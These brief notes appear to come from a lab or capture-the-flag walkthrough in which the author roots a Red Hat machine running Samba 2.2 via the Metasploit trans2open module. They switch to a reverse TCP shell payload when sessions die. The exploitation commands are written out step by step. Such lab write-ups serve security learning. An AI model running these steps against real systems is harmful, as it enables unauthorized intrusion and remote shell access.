# Gaining root access

Author looks up any exploit for samba 2.2 using `searchsploit samba 2.2`.

Notices a lot of `trans2open` results, so then he runs
`msfconsole` and runs `search trans2open`.

From the results, uses linux module since we know the machine is red hat linux:
`exploit/linux/samba/trans2open`

(Author mentions that `exploit` is the same as `run`)

After running it for the first time, we see that sessions are dying.

To fix this, author changes the payload by doing the following:
`set payload linux/x86/shell_reverse_tcp`

And so, root access is gained.
